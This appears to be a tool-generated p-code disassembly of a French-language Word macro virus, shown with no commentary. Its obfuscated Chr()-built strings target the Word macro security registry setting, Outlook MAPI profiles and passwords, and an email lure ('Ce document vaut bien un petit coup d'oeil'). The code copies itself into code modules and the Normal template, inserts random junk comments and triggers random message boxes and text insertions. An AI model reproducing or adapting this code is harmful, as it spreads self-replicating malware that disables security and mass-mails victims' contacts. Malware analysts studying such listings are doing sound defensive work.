' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000A 0x0005 " dmlp"
' Line #100:
' 	Ld c9 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0004 
' 	Add 
' 	FnInt 
' 	St e6 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d5 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld e6 
' 	For 
' 	BoS 0x0000 
' 	Ld c9 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d5 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0081 0x000C " nanslupschi"
' Line #101:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld c6 
' 	Ld c9 
' 	Ld f5 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' 	BoS 0x0000 
' 	Ld c6 
' 	LitDI2 0x0001 
' 	Add 
' 	St c6 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St c9 
' 	QuoteRem 0x0043 0x000F " nrkcytmbuflphr"
' Line #102:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0008 " xxxspio"
' Line #103:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' 	QuoteRem 0x000A 0x0005 " kjcf"
' Line #104:
' 	Ld b8 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000C " mqgbbigipro"
' Line #105:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000A 0x000C " ynqjqceeeyr"
' Line #106:
' 	ExitDo 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0014 0x0006 " lqclz"
' Line #107:
' 	Loop 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld l2 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000E 0x000B " qzmhxmfqqh"
' Line #108:
' 	Ld k3 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x0014 0x0006 " myubo"
' Line #109:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld g6 
' 	Ld f5 
' 	MemSt New 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x003D 0x000C " qnaekkfnwqr"
' Line #110:
' 	Ld i6 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x0014 0x0009 " yjisbyfk"
' Line #111:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x0007 " hhktfc"
' Line #112:
' 	Ld g6 
' 	Ld f5 
' 	MemSt New 
' 	QuoteRem 0x000D 0x000A " nkpbrexwm"
' Line #113:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	QuoteRem 0x0038 0x0008 " cflnbkt"
' Line #114:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld m1 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F8E 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0092 0x0006 " mxqwo"
' Line #115:
' 	LineCont 0x0004 1E 00 00 00
' 	Ld h8 
' 	Ld l5 
' 	Add 
' 	Ld i1 
' 	Add 
' 	Ld i7 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld g5 
' 	Ld e1 
' 	Add 
' 	Ld m4 
' 	Add 
' 	Ld b3 
' 	Add 
' 	Ld d4 
' 	Add 
' 	Ld f7 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld i3 
' 	Ld g2 
' 	Add 
' 	Ld e5 
' 	Add 
' 	Ld d2 
' 	Add 
' 	Ld a4 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0013 0x000A " huvdcupsw"
' Line #116:
' 	LineCont 0x0004 09 00 00 00
' 	Ld a3 
' 	Ld a2 
' 	Add 
' 	Ld c2 
' 	Add 
' 	Ld d1 
' 	Add 
' 	Ld c3 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0007 0x000E " ngdeadlolookk"
' Line #117:
' 	LineCont 0x0004 08 00 00 00
' 	Ld c1 
' 	Ld b2 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld b1 
' 	Ld a1 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x000C 0x000F " ejzjrtgnsrqemj"
' Line #118:
' 	LineCont 0x0004 02 00 00 00
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld b9 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	LitR8 0xD70A 0x70A3 0x0A3D 0x3FA7 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x002F 0x0010 " vbvnewxwhdidito"
' Line #119:
' 	Ld a7 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0016 0x000A " irozpnezl"
' Line #120:
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3FAE 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld d6 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0026 0x000A " proghcjbh"
' Line #121:
' 	LitR8 0x3333 0x3333 0x3333 0x3FB3 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0010 0x000D " pmadcdesodar"
' Line #122:
' 	Ld c5 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0016 0x0006 " qgjwd"
' Line #123:
' 	LitR8 0xD70A 0x70A3 0x0A3D 0x3FB7 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0010 " vyvzsbusezdkcqi"
' Line #124:
' 	Ld e2 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0016 0x000B " wrmmjnflxr"
' Line #125:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	QuoteRem 0x0044 0x000A " owyxsmbqi"
' Line #126:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0034 0x000E " cnsmdqfwssper"
' Line #127:
' 	EndSub 
' 	QuoteRem 0x0008 0x0006 " drnnt"
' Line #128:
' 	FuncDefn (Private Sub f1())
' 	BoS 0x0000 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h7 
' 	QuoteRem 0x0049 0x0005 " jeop"
' Line #129:
' 	LineCont 0x0010 4E 00 00 00 67 00 00 00 9C 00 00 00 BF 00 00 00
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g8 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j1 
' 	BoS 0x0000 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	QuoteRem 0x0048 0x000C " kjiyrjlsmxf"
' Line #130:
' 	LineCont 0x0014 04 00 00 00 27 00 00 00 3E 00 00 00 58 00 00 00 B2 00 00 00
' 	Ld k2 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j8 
' 	QuoteRem 0x0016 0x0005 " cieb"
' Line #131:
' 	LineCont 0x0008 0B 00 00 00 15 00 00 00
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l1 
' 	QuoteRem 0x000B 0x000C " azdhawyveld"
' Line #132:
' 	LineCont 0x0004 05 00 00 00
' 	LitDI2 0x0000 
' 	St m5 
' 	BoS 0x0000 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l8 
' 	QuoteRem 0x0028 0x0007 " wifhvc"
' Line #133:
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a5 
' 	QuoteRem 0x006E 0x0010 " ycqrmkcilxqsutu"
' Line #134:
' 	LineCont 0x0014 21 00 00 00 22 00 00 00 27 00 00 00 37 00 00 00 81 00 00 00
' 	Ld a5 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a5 
' 	BoS 0x0000 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	QuoteRem 0x003E 0x0006 " znmce"
' Line #135:
' 	Ld d3 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	QuoteRem 0x00E7 0x0010 " tmideqvudfthcit"
' Line #136:
' 	LineCont 0x0018 03 00 00 00 3B 00 00 00 59 00 00 00 7B 00 00 00 81 00 00 00 BC 00 00 00
' 	Ld d3 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g6 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Non"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h3 
' 	BoS 0x0000 
' 	Ld h3 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Travail"
' 	Add 
' 	St h3 
' 	BoS 0x0000 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k1 
' 	BoS 0x0000 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k5 
' 	BoS 0x0000 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g3 
' 	QuoteRem 0x0055 0x000C " xofgafojpgs"
' Line #137:
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n6 
' 	QuoteRem 0x0023 0x000F " auujmijblwdaze"
' Line #138:
' 	LitStr 0x000D "Suggestion..."
' 	St h5 
' 	QuoteRem 0x0015 0x000E " iticilkpadgri"
' Line #139:
' 	LineCont 0x0008 0B 00 00 00 1E 00 00 00
' 	LitStr 0x0002 "Ce"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "document"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "vaut"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	St j5 
' 	QuoteRem 0x0013 0x0006 " hcahr"
' Line #140:
' 	LineCont 0x0008 3D 00 00 00 46 00 00 00
' 	Ld j5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "petit"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "coup"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "oeil."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "J"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "aimerais"
' 	Add 
' 	St j5 
' 	BoS 0x0000 
' 	Ld j5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "savoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "correspond"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j5 
' 	QuoteRem 0x0055 0x000B " kgisnaaetv"
' Line #141:
' 	LineCont 0x0018 05 00 00 00 0A 00 00 00 37 00 00 00 59 00 00 00 5F 00 00 00 6D 00 00 00
' 	Ld j5 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
